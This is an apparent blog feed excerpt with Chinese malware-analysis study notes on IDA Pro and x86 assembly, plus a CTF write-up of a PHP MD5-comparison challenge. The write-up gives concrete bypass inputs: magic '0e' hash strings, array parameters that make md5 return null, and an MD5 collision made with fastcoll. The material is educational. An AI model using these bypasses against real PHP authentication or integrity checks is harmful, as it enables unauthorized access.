class="headerlink" title="5x4 分析函数"></a>5x4 分析函数</h2><p>创建函数：  P<br>无法识别出基于EBP的一个栈帧的修复： 按Alt+P，选择BP Based Frame，然后指定4 bytes for Saved Registers</p><h2 id="5x5-使用图形选项"><a href="#5x5-使用图形选项" class="headerlink" title="5x5 使用图形选项"></a>5x5 使用图形选项</h2><p><img src="https://i.loli.net/2018/07/19/5b501e9930e37.jpg" alt="mark"></p><h2 id="5x6-增强反汇编"><a href="#5x6-增强反汇编" class="headerlink" title="5x6 增强反汇编"></a>5x6 增强反汇编</h2><p>IDA Pro没有撤销</p><ol><li>重命名</li><li>注释：将光标放在反汇编的某行上，并按冒号（:）</li><li>格式化操作数</li><li>使用命名的常量—-手动加载有关类型库：选择View-&gt;Open Subviews-&gt;Type Libraries</li><li>重新定义代码和数据<ol><li>按U取消函数，代码或数据的定义</li><li>按C定义原始字节为代码</li><li>按D定义原始字节为数据</li><li>按A定义原始字节为ASCII字符串</li></ol></li></ol><h2 id="5x7-用插件扩展IDA"><a href="#5x7-用插件扩展IDA" class="headerlink" title="5x7 用插件扩展IDA"></a>5x7 用插件扩展IDA</h2><h3 id="1-IDC脚本"><a href="#1-IDC脚本" class="headerlink" title="1. IDC脚本"></a>1. IDC脚本</h3><p>File-&gt;Script File   简单运行<br>File-&gt;IDC Command  作为单独命令运行</p><h3 id="2-IDAPython"><a href="#2-IDAPython" class="headerlink" title="2. IDAPython"></a>2. IDAPython</h3><h3 id="3-使用商业插件"><a href="#3-使用商业插件" class="headerlink" title="3. 使用商业插件"></a>3. 使用商业插件</h3><p>Hex-Rays生成伪代码<br>zynamics BinDiff比较两个IDA Pro数据库</p><p>From <a href="https://kabeor.github.io/第5章 IDA Pro/">https://kabeor.github.io/第5章 IDA Pro/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第5章-IDA-Pro&quot;&gt;&lt;a href=&quot;#第5章-IDA-Pro&quot; class=&quot;headerlink&quot; title=&quot;第5章 IDA Pro&quot;&gt;&lt;/a&gt;第5章 IDA Pro&lt;/h1&gt;&lt;p&gt;本章介绍了IDA Pro的使用方法，本文就只大致记录常用功能&lt;/p&gt;
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>对强网杯2018“Web签到”的思考</title>
    <link href="https://kabeor.github.io/%E5%AF%B9%E5%BC%BA%E7%BD%91%E6%9D%AF2018%E2%80%9CWeb%E7%AD%BE%E5%88%B0%E2%80%9D%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>https://kabeor.github.io/对强网杯2018“Web签到”的思考/</id>
    <published>2018-03-29T11:50:54.379Z</published>
    <updated>2018-07-19T05:24:18.405Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对强网杯2018“Web签到”的思考"><a href="#对强网杯2018“Web签到”的思考" class="headerlink" title="对强网杯2018“Web签到”的思考"></a>对强网杯2018“Web签到”的思考</h1><p>题目地址：  <a href="http://39.107.33.96:10000/" target="_blank" rel="noopener">http://39.107.33.96:10000/</a></p><p>题目共分为三层</p><ol><li>PHP处理0e开头的md5哈希字符串的缺陷</li><li>MD5函数不能处理数组</li><li>字符串md5碰撞<h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><img src="https://i.loli.net/2018/07/19/5b50207c83973.jpg" alt="mark"><br>我们查看源码，可以找到<br><img src="https://i.loli.net/2018/07/19/5b50207c9c081.jpg" alt="mark"></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!=$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])==md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这里PHP在处理哈希字符串时，利用”==”来对哈希值进行比较，把每一个以”0E”开头的哈希值都解释为0，因此如果两个不同的密码经过哈希以后，其哈希值都是以”0e”开头的，那么PHP将会认为它们都是0。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在PHP中，e可以指幂，因此</p><pre><code>0e123456   等价于   0*10^123456</code></pre><p>0乘任何数等于零，因此0e开头的md5全部等于0，也就做到了这里的</p><pre><code>md5($_POST[&apos;param1&apos;])==md5($_POST[&apos;param2&apos;]</code></pre><p>这里我使用的是</p><blockquote><p>s878926199a     md5: 0e545993274517709034328855841020<br>s155964671a     md5: 0e342768416822451524974117254469</p></blockquote><h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><p><img src="https://i.loli.net/2018/07/19/5b50207caf867.jpg" alt="mark"><br>查看源码<br><img src="https://i.loli.net/2018/07/19/5b50207cc168b.jpg" alt="mark"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这里变成了===操作符，严格等于，因此我们无法利用0e<br>因此我们需要符合的条件为构建两个参数 使得他们类型或者值不相同 但哈希值相同</p><p>这里我们考虑到，PHP的md5函数用法如下</p><pre><code>md5(string,raw)</code></pre><blockquote><p>string    必需。规定要计算的字符串。</p><p>raw<br>可选。规定十六进制或二进制输出格式：<br>TRUE - 原始 16 字符二进制格式<br>FALSE - 默认。32 字符十六进制数</p><p>返回值：    如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。</p></blockquote><p>因此，如果md5中的参数不是字符串（string），则会返回null<br>所以如果我们传入两个值不同的数组，就会出现</p><pre><code>null===null</code></pre><p>符合条件</p><p>使用Burpsuite抓包，传数组<br><img src="https://i.loli.net/2018/07/19/5b50207cd5201.jpg" alt="mark"></p><h2 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h2><p><img src="https://i.loli.net/2018/07/19/5b50207ce709f.jpg" alt="mark"><br>源码<br><img src="https://i.loli.net/2018/07/19/5b50207d0abe5.jpg" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">if((string)$_POST[&apos;param1&apos;]!==(string)$_POST[&apos;param2&apos;] &amp;&amp; md5($_POST[&apos;param1&apos;])===md5($_POST[&apos;param2&apos;]))&#123;</span><br><span class="line">die(&quot;success!);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这次PHP将两个参数强行转成string.</p><p>没有漏洞，我们只能考虑md5碰撞</p><h3 id="原理（个人理解，如有错误请指正）"><a href="#原理（个人理解，如有错误请指正）" class="headerlink" title="原理（个人理解，如有错误请指正）"></a>原理（个人理解，如有错误请指正）</h3><p>2005年王小云提出了md5哈希碰撞，公式如下</p><pre><code>f(f(s, M), M&apos;) = f(f(s, N), N&apos;)</code></pre><p>先将明文进行64bit分组，不足的则填充，这样它的长度将是64字节的倍数。</p><p>接下来将其分为单个的64bit字节块M0, M1, …, Mn-1。</p><p>而md5的hash是由16字节的序列s0, …, sn来计算。计算规则为：si+1 = f(si, Mi) ，（i为角标）， f是一个固定函数。s0是初始化向量，sn是最终状态，即计算的md5 hash</p><p>对于给定的初始化向量s，找出两组M，M’和N，N’，使得f（f（s，M），M’）= f（f（s，N），N’）  ，重要的是这里不仅仅适用于标准初始化矢量s0，而对于任何初始化矢量s都适用。</p><p>也就是说对于两个不同的消息分组 M、N，s 相同，经过两次 f 函数后得到的结果是一样的。</p><p>因此可以找到任意长度的对文件，除了文件中间的128个字节，它们是相同的，而且它们具有相同的MD5散列。</p><p><img src="https://i.loli.net/2018/07/19/5b50207d22366.jpg" alt="mark"><br>为了便于理解，自己做了个图</p><p>m0 m1经过两次f函数所得的hash是相同的</p><p>如果对这个有兴趣，推荐下面的网站</p><p>md5相关知识： <a href="http://www.unixwiz.net/techtips/iguide-crypto-hashes.html" target="_blank" rel="noopener">http://www.unixwiz.net/techtips/iguide-crypto-hashes.html</a><br>可视化md5碰撞演示： <a href="http://www.links.org/?p=6" target="_blank" rel="noopener">http://www.links.org/?p=6</a><br>用相同的MD5散列创建两个PHP文件： <a href="https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html" target="_blank" rel="noopener">https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html</a><br>Are there two known strings which have the same MD5 hash value?： <a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="noopener">https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value</a></p><p>我们使用md5碰撞软件fastcoll生成两个md5相同的文件，经url编码后上传即可得到flag。</p><p>From <a href="https://kabeor.github.io/对强网杯2018“Web签到”的思考/">https://kabeor.github.io/对强网杯2018“Web签到”的思考/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;对强网杯2018“Web签到”的思考&quot;&gt;&lt;a href=&quot;#对强网杯2018“Web签到”的思考&quot; class=&quot;headerlink&quot; title=&quot;对强网杯2018“Web签到”的思考&quot;&gt;&lt;/a&gt;对强网杯2018“Web签到”的思考&lt;/h1&gt;&lt;p&gt;题目地址： 
      
    
    </summary>
    
      <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
      <category term="WriteUP" scheme="https://kabeor.github.io/categories/Web/WriteUP/"/>
    
    
      <category term="writeup" scheme="https://kabeor.github.io/tags/writeup/"/>
    
      <category term="web" scheme="https://kabeor.github.io/tags/web/"/>
    
      <category term="PHP漏洞" scheme="https://kabeor.github.io/tags/PHP%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="md5" scheme="https://kabeor.github.io/tags/md5/"/>
    
  </entry>
  
  <entry>
    <title>第4章 x86反汇编速成班</title>
    <link href="https://kabeor.github.io/%E7%AC%AC4%E7%AB%A0%20x86%E5%8F%8D%E6%B1%87%E7%BC%96%E9%80%9F%E6%88%90%E7%8F%AD/"/>
    <id>https://kabeor.github.io/第4章 x86反汇编速成班/</id>
    <published>2018-03-23T05:56:19.767Z</published>
    <updated>2018-07-19T05:16:17.266Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第4章-x86反汇编速成班"><a href="#第4章-x86反汇编速成班" class="headerlink" title="第4章 x86反汇编速成班"></a>第4章 x86反汇编速成班</h1><h2 id="4x1-抽象层次"><a href="#4x1-抽象层次" class="headerlink" title="4x1 抽象层次"></a>4x1 抽象层次</h2><blockquote><p>恶意代码分析时的三种编码层次<br><img src="https://i.loli.net/2018/07/19/5b501e70df5dd.jpg" alt="mark"></p><p>计算机系统的六个抽象层次</p></blockquote><p><strong>硬件</strong>   硬件层是唯一的一个物理层，由电子电路组成。这些电路实现了XOR门、AND门、OR门和NOT门等逻辑运算器的复杂组合，称为数字逻辑（digital logic）。由于物理特性，硬件很难被软件所操纵。</p><p><strong>微指令</strong>  微指令层又称为固件（firmware）。微指令只能在为它设计的特定电路上执行。这层由一些微指令构成，它们从更高的机器码层翻译而来，提供了访问硬件的接口。当分析恶意代码时，我们通常不关心微指令，因为它们通常是为特定的计算机硬件设计的。</p><p><strong>机器码</strong>  机器码层由操作码（opcode ）组成，操作码是一 些十六进制形式的数字，用于告诉处理器你想要它做什么。机器码一般由多条微指令实现，这样底层硬件就能实际执行代码了。而机器码本身又由高级语言编写的计算机程序编译而来。</p><p><strong>低级语言</strong>  低级语言是计算机体系结构指令集的人类易读版本，主要是汇编语言。恶意代码分析师使用这一层，因为对人来说，机器码太难理解了。我们使用反汇编器来生成低级语言的文本，这些文本由一些简单的助记符组成，如mov和jmp。</p><p><strong>高级语言</strong> 大部分程序员使用高级语言。高级语言对机器层做了很强的抽象，从而可以很轻松地使用程序逻辑和流控制机制。高级语言包括C、C＋＋等。它们被一个编译器经过称为编译的过程转化为机器码。</p><p><strong>解释性语言</strong>  解释型语言位于最高层。很多程序员使用诸如C＃、Perl、.NET、Java等解释语言。这一层的代码不会被编译为机器码，而是被翻译为了字节码。字节码 （bytecode）是特定于该语言的一种中间表示，它在解释器中执行。解释器（interpreter）是一个在运行时将字节码实时翻译为可执行机器码的程序。相比于传统被编译的代码，解释器提供了一种自动的抽象层次，因为它可以独立于操作系统，自己处理错误和管理内存。</p><h2 id="4x2-逆向工程"><a href="#4x2-逆向工程" class="headerlink" title="4x2 逆向工程"></a>4x2 逆向工程</h2><blockquote><p>恶意代码存储在磁盘上时，通常是机器码层的二进制形式。前面提到，机器码是一种计算机可以快速高效执行的代码形式。而我们反汇编恶意代码，就是使用反汇编器（disassembler），将恶意代码二进制文件作为输入，输出汇编语言代码。</p><p>汇编语言实际上是一类语言的统称。每种汇编语言的方言，都是用来对一 类微处理器家族编程的，例如，x86、x64、SPARC、PowerPC、MIPS、ARM 等。目前，x86是PC上最流行的体系结构。</p><p>x86，又称为IntelIA-32，是大部分32位PC使用的体系结构，微软目前所有的32位Windows系统也都运行在 x86上。此外，大部分运行在AM D64和Intel64体系结构上的W indows也都支持x86的32位二进制程序。正因如此，大部分恶意代码是为x86编译的。</p></blockquote><h2 id="4x3-x86体系结构"><a href="#4x3-x86体系结构" class="headerlink" title="4x3 x86体系结构"></a>4x3 x86体系结构</h2><p>大部分现代计算机体系结构（包括x86）在内部实现上遵循冯·诺依曼结构。这种结构包含3种硬件组件：</p><blockquote><p>•    中央处理单元（ CPU ），负责执行代码<br>•    内存（RAM），负责存储所有的数据和代码。<br>•    输入／输出系统（IO），为硬盘、键盘、显示器等设备提供接口。</p></blockquote><p>指针（instruction pointer）的寄存器（register）从内存取得要执行的指令，这个寄存器中存有指令的地址。寄存器是CPU中数据的基本存储单元，通过它，很多时候CPU不再需要访问内存，从而节省了时间。算术逻辑单元（arithmetic logic unit, ALU）执行从内存取来的指令，并将结果放到寄存器或内存中。一条条取指令、执行指令的过程不断重复，就形成了程序的运行。</p><p>冯诺依曼体系结构<br><img src="https://i.loli.net/2018/07/19/5b501e7100c59.jpg" alt="mark"></p><h3 id="1-内存"><a href="#1-内存" class="headerlink" title="1.内存"></a>1.内存</h3><p>一个程序的内存可分为如下四个主要的节<br><img src="https://i.loli.net/2018/07/19/5b501e71145f6.jpg" alt="mark"></p><blockquote><p><strong>数据</strong> 这个词指的是内存中一 个特定的节，名为数据节 （data section），其中包含了一 些值。这些值在程序初始加载时被放到这里，称为静态值（static value），因为程序运行时它们可能并不发生变化，还可以称为全局值（global value），因为程序的任何部分都可以使用它们。</p><p><strong>代码</strong> 代码节包含了在执行程序任务时CPU所取得的指令。这些代码决定了程序是做什么的，以及程序中的任务如何协调工作。</p><p><strong>堆</strong> 堆是为程序执行期间需要的动态内存准备的，用于创建（分配）新的值，以及消除（释放）不再需要的值。将其称为动态内存（dynamic memory），是因为其内容在程序运行期间经常被改变。</p><p><strong>栈</strong> 栈用于函数的局部变量和参数，以及控制程序执行流。</p></blockquote><h3 id="2-指令"><a href="#2-指令" class="headerlink" title="2. 指令"></a>2. 指令</h3><p>指令是汇编程序的构成块。在x86、汇编语言中，一条指令由一个助记符，以及零个或多个操作数组成。</p><h3 id="3-操作码和字节序"><a href="#3-操作码和字节序" class="headerlink" title="3. 操作码和字节序"></a>3. 操作码和字节序</h3><p>每条指令使用操作码告诉CPU程序要执行什么样的操作。<br>反汇编器将操作码翻译为人类易读的指令。</p><p>数据的字节序（enclianness）是指在一个大数据项中，最高位（大端，big-endian）还是最低位（小端，little-enclian）被排在第一位 （即排在最低的地址上）。</p><h3 id="4-操作数"><a href="#4-操作数" class="headerlink" title="4. 操作数"></a>4. 操作数</h3><p>操作数说明指令要使用的数据。有以下三种类型：</p><blockquote><p>立即数（immediate）操作数是一个固定的值<br>寄存器（register）操作数指向寄存器<br>内存地址（memory address）操作数指向感兴趣的值所在的内存地址，一般由方括号内包含值、寄存器或方程式组成，如［eax］。</p></blockquote><h3 id="5-寄存器"><a href="#5-寄存器" class="headerlink" title="5. 寄存器"></a>5. 寄存器</h3><p>寄存器是可以被CPU使用的少量数据存储器，访问其中内容的速度会比访问其他存储器要快。x86处理器中有一组寄存器，可以用于临时存储或者作为工作区。</p><p>最常用的x86寄存器，可以将它们归为以下四类：</p><blockquote><p>通用寄存器，CPU在执行期间使用。<br>段寄存器，用于定位内存节。<br>状态标志，用于做出决定。<br>指令指针，用于定位要执行的下一条指令。</p></blockquote><p>x86寄存器<br><img src="https://i.loli.net/2018/07/19/5b501e712850c.jpg" alt="mark"></p><p>所有通用寄存器的大小都是32位，可以在汇编代码中以32位或16位引用。</p><p>有4个寄存器（EAX、EBX、ECX、EDX）还可以8位值的方式引用，从而使用其最低的8位，或次低的8位。</p><p><strong>通用寄存器</strong>  通用寄存器一般用于存储数据或内存地址，而且经常交换着使用以完成程序。不过，虽然它们被称为通用寄存器，但它们并不完全通用。</p><p>一些x86指令只能使用特定的寄存器。例如，乘法和除法指令就只能使用EAX和EDX。</p><p><strong>标志寄存器</strong>  EFLAGS寄存器是一个标志寄存器。在x86架构中，它是32位的，每一位是一个标志。在执行期间，每一位表示要么是置位（值为1），要么是清除（值为0），并由这些值来控制CPU 的运算，或者给出某些CPU运算的值。</p><p>对恶意代码分析来说，最重要的一些标志介绍如下：</p><blockquote><p><strong>ZF</strong>  当一个运算的结果等于0时，ZF被置位，否则被清除。<br><strong>CF</strong>  当一个运算的结果相对于目标操作数太大或太小时，CF被置位，否则被清除。<br><strong>SF</strong>  当一 个运算的结果为负数，SF被置位；若结果为正数，SF被清除。对算术运算，当运算结果的最高位值为l时，SF也会被置位。<br><strong>TF</strong> TF用于调试。当它被置位时，x86处理器每次只执行一条指令。</p></blockquote><p><strong>EIP指令指针</strong><br>在x86架构中，EIP寄存器，又称为指令指针或程序计数器，保存了程序将要执行的下一条指令在内存中的地址。EIP的唯一作用就是告诉处理器接下来要做什么。</p><blockquote><p>注意：当EIP被破坏（即指向了一个不包含合法程序代码的内存地址 ）时，CPU 无法取得一条合法指令来执行，此时正在运行的程序就可能崩溃。当你控制了EIP，也就控制了CPU将要执行什么，这也就是为什么攻击者试图通过漏洞利用获得对EIP的控制。通常，攻击者先妥使攻击代码进入内存，然后改变EIP使其指向那段代码，从而攻击系统。</p></blockquote><h3 id="6-简单指令"><a href="#6-简单指令" class="headerlink" title="6. 简单指令"></a>6. 简单指令</h3><h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a><strong>mov</strong></h4><p>用于将数据从一个位置移动到另一个位置</p><p>mov指令可以将数据移动到寄存器或内存，其格式是：mov destination, source</p><p>由方括号括起来的操作数是对内存中数据的引用。例如，［ebx]指向内存中地址为EBX处的数据。</p><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a><strong>lea</strong></h4><p>lea指令用来将一个内存地址赋给目的操作数。</p><p> “load effective address“（加载有效地址）的缩写。它的格式是lea destination, source。</p><p>例如，lea eax, [ebx+8］就将EBX+8的值给EAX。</p><p>lea指令并非专门用于计算内存地址。它还被用来计算普通的值，因为它所需的指令更少。</p><h4 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h4><p>加法和减法是从目标操作数中加上或减去一个值。</p><p>加法指令的格式是add destination, value。</p><p>减法的指令是sub destination, value。<br>sub指令会修改两个重要的标志：ZF和CF。<br>如果结果为零，ZF被置位；如果目标操作数比要减去的值小，则CF被置位。</p><p>inc和dec指令将一个寄存器加一和减一 。</p><p><img src="https://i.loli.net/2018/07/19/5b501e713bdd5.jpg" alt="mark"></p><p>乘法和除法都使用了一个预先规定的寄存器，因此其指令很简单，就是指令码加上寄存器要去乘或除的值。</p><p>mul指令的格式是mul value;<br>div指令的格式是div value。</p><p>mul或div指令要操作的寄存器一般会在之前许多条指令的地方被赋值，因此你可能需要在程序的上下文中来寻找。</p><p><img src="https://i.loli.net/2018/07/19/5b501e7150bf6.jpg" alt="mark"></p><p>mul value指令总是将eax乘上value。因此，EAX寄存器必须在乘法指令出现前就赋值好。乘法的结果以64位的形式分开存储在两个寄存器中：EDX和EAX。其中，EDX存储了高的32位，EAX存储低的32位。</p><p>div value指令将EDX和EAX合起来存储的64位值除以value。因此，在做除法之前，EDX和EAX这两个寄存器必须赋值好。除法的商将存储到EAX，余数则存储在EDX中。</p><p><strong>模（mod）</strong>运算会被编译为在div指令后取EDX寄存器的值（因为除法保留了余数）</p><h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><p>x86架构还使用逻辑运算符，例如OR、AND和XOR。其相应指令的用法与add和sub类似，对源操作数和目的操作数做相应的操作，并将结果保存在目的操作数中。</p><p><em>xor eax, eax就一种将EAX寄存器快速置0的方法。这么做是为了优化，因为这条指令只需要2个字节，而mov eax, 0需要5个字节。</em></p><p>shr和shl指令用于对寄存器做移位操作。</p><p>shr指令的格式是 “shr destination, count”<br>shl指令的格式是 “shl destination, count” </p><p>shr和shl指令对目的操作数右移或左移，由count决定移多少位。移出目的操作数边界的位则会先移动到CF标志位中。在移位时，使用0填充新的位。移位运算全部完成后，CF标志位中就包含了最后移出目的操作数的那一位。</p><p>循环移位指令ror和rol与移位指令类似，但移出的那一位会被填到另一端空出来的位上，即右循环移位（ror）会将最低位循环移到最高位；左循环移位Crol)则相反。</p><p>移位经常被用于对乘法运算的优化。由于不需要像乘法那样设置寄存器、移动数据，移位会更简单、更快。</p><p>在分析恶意代码时，如果遇到一个函数中只有xor、or、and、shl、ror、shr、rol这样的指令，并且它们反复出现，看起来随机排列的样子，就可能是遇到了一个加密或者压缩函数。最好是将其标记为一个加密函数，然后继续后面的分析。</p><p><img src="https://i.loli.net/2018/07/19/5b501e7165db8.jpg" alt="mark"></p><h4 id="NOP指令"><a href="#NOP指令" class="headerlink" title="NOP指令"></a><strong>NOP指令</strong></h4><p>当它出现时，直接执行下一条指令。</p><p>这条指令的opcode是Ox90。在缓冲区溢出攻击中，当攻击者无法完美地控制利用代码，就经常使用NOP滑板。它起到了填充代码的作用，以降低shellcode可能在中间部分开始执行所造成的风险。</p><h3 id="7-栈"><a href="#7-栈" class="headerlink" title="7. 栈"></a>7. 栈</h3><p>用于函数的内存、局部变量、流控制结构等被存储在栈中。</p><p>栈是一种用压和弹操作来刻画的数据结构，向战中压入一些东西，然后再把它们弹出来。</p><p>它是一种后入先出（LIFO）的结构。</p><p>与栈有关的指令包括push、pop、call、leave、enter、和ret。在内存中，栈被分配成自顶向下的，最高的地址最先被使用。当一个值被压入战时，使用低一点的地址。</p><p>栈只能用于短期存储。它经常用于保存局部变量、参数和返回地址。其主要用途是管理函数调用之间的数据交换。而不同的编译器对这种管理方法的具体实现有所不同，但大部分常见约定都使用相对EBP的地址来引用局部变量与参数。</p><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><p>许多函数包含一 段 “序言” （prologue），它是在函数开始处的少数几行代码，用于保存函数中要用到的栈和寄存器。相应的，在函数结尾的 “结语” （epilogue）则将技和这些寄存器恢复至函数被调用前的状态。</p><p>下面列举了函数调用最常见的实现流程</p><blockquote><ol><li>使用push指令将参数压入栈中。</li><li>使用call memory_location来调用函数。此时，当前指令地址（指EIP寄存器中的内容）被压入栈中。这个地址会在函数结束后，被用于返回到主代码。当函数开始执行时，EIP的值被设为memory_location （即函数的起始地址）。</li><li>通过函数的序言部分，分配栈中用于局部变量的空间，EBP （基址指针）也被压入栈中。这样就达到了为调用函数保存EBP的目的。</li><li>函数开始做它的工作。</li><li>通过函数的结语部分，恢复。调整E回来释放局部变量，恢复EBP，以使得调用函数可以准确地定位它的变量。leave指令可以用作结语，因为它的功能是使ESP等于EBP，然后从栈中弹出EBP。</li><li>函数通过调用ret指令返回。这个指令会从栈中弹出返回地址给EIP，因此程序会从原来调用的地方继续执行。</li><li>调整栈，以移除此前压入的参数，除非它们在后面还要被使用。</li></ol></blockquote><p>x86架构还提供了其他弹出和压入的指令，其中最常用的是pusha和pushad。它们将所有的寄存器都压入战中，并且常与popa和popad结合使用，后者从栈中弹出所有的寄存器。</p><p>pusha和pushad的具体功能如下。</p><blockquote><p>•    pusha以下面的顺序将所有16位寄存器压入栈中：AX、EX、DX 、BX 、SP、BP、SI、DI<br>• pushad以下面的顺序将所有32位寄存器压入栈中：EAX、ECX 、EDX 、EBX 、ESP、EBP、ESI、 EDI</p></blockquote><p><em>在shellcode中，如果要将寄存器的当前状态全部保存在栈上，以便稍后恢复，就常使用这些指令。编译器很少使用它们，因此，看到它们，通常说明是某人手工写的汇编代码或者shellcode。</em></p><h3 id="8-条件指令"><a href="#8-条件指令" class="headerlink" title="8. 条件指令"></a>8. 条件指令</h3><p>最常见的两个条件指令是test和cmp。</p><p>test指令与and指令的功能一样，但它并不会修改其使用的操作数。test指令只设置标志位。</p><p>对某个东西与它自身的test经常被用于检查它是否是一个NULL值。</p><p>cmp指令与sub指令的功能一样，但它不影响其操作数。cmp指令也是只用于设置标志位，其执行结果是，ZF和CF标志位可能发生变化。</p><h3 id="9-分支指令"><a href="#9-分支指令" class="headerlink" title="9. 分支指令"></a>9. 分支指令</h3><p>最常见的分支指令是跳转指令。程序中使用了大量的跳转指令，其中最简单的是jmp指令，它使得下一条要被执行的指令是其格式jmp location中指定位置的指令，又被称为无条件跳转，因为总会跳到目的位置去执行。这个简单的跳转无法满足所有的跳转需求。</p><p><img src="https://i.loli.net/2018/07/19/5b501e7188b0c.jpg" alt="mark"></p><h3 id="10-重复指令"><a href="#10-重复指令" class="headerlink" title="10. 重复指令"></a>10. 重复指令</h3><p>重复指令是一组操作数据缓冲区的指令。数据缓冲区通常是一个字节数组的形式，也可以是单字或者双字。</p><p>常见的数据缓冲区操作指令是movsx, cmpsx、stosx和scasx，其中x可以是b、w或者d，分别表示字节、字和双字。这些指令对任何形式的数据都有效。</p><p>在这些操作中，使用ESI和EDI寄存器。ESI是源索引寄存器，EDI是目的索引寄存器。还有ECX用作计数的变量。</p><p>这些指令还需要一 个前缀，用于对长度超过1的数据做操作。movsb指令本身只会移动一 个字节，而不使用ECX 寄存器。</p><p><img src="https://i.loli.net/2018/07/19/5b501e71a088e.jpg" alt="mark"></p><p>在x86下，使用重复前缀来做多字节操作。rep指令会增加ESI和EDI这两个偏移，减少ECX寄存器。rep前缀会不断重复，直至ECX=O。repe／repz和repne/repnz前缀则不断重复，直至ECX=O或直至ZF= 1或0。</p><p>movsb指令用于将一串字节从一个位置移动到另一 个位置。rep前缀经常与movsb一起使用，从而复制一串长度由ECX 决定的字节。从逻辑上说，rep movsb指令等价于C语言的memcpy函数。movsb指令从ESI指向地址取出一 个字节，将其存入ED I指向地址，然后根据方向标志（DF）的设置，将ESI和EDI的值加1或者减1。如果DF=O，则加，否则减。</p><p>在由C代码编译后的结果中，很少能看到DF标志。但是在shellcode里，人们有时候会调换方向标志，这样就可以反方向存储数据。如果有rep前缀，就会检查ECX是否为0，如果不等于0，则指令继续从ESI移动一个字节到EDI并将ECX 寄存器减1。这个过程会不断重复，直至ECX=0。</p><p>cmpsb指令用于比较两串字节，以确定其是否是相同的数据。cmpsb指令用ESI指向地址的字节减去EDI指向地址的字节，并更新相关的标志位。它经常与repe前缀一起使用。此时，cmpsb指令逐一比较两串字节，直至发现一处不同，或比较到头。cmpsb指令从地址ESI获得一 个字节，将其与ED I指向位置的字节进行比较，并设置标志位，然后对ESI和EDI分别加1。如果有「epe前缀，就检查ECX的值和标志位，如果ECX=O或者ZF=O，就停止重复。这相当于C语言中的memcmp函数。</p><p>scasb指令用于从一串字节中搜索一 个值。这个值由AL寄存器给出。它的工作方式与cmpsb一样，但是它是将ESI指向地址的字节与AL进行比较，而不是与EDI指向地址的字节比较。repe操作会使得这个比较不断继续，直到找到该字节，或者ECX=O。如果在这串字节中找到了那个值，则其位置会被存储在ESI中。</p><p>stosb指令用于将值存储到EDI指向的地址。它与scasb一样，但不是去搜索，而是将指定的字节存入EDI指向的地址。rep前缀与scasb一起使用后，就初始化了一段内存缓冲区，其中的每个字节都是相同的值。这等价于C语言的memset函数。</p><p><img src="https://i.loli.net/2018/07/19/5b501e71b359d.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501e7e0729d.jpg" alt="mark"></p><h3 id="11-C语言主函数和偏移"><a href="#11-C语言主函数和偏移" class="headerlink" title="11. C语言主函数和偏移"></a>11. 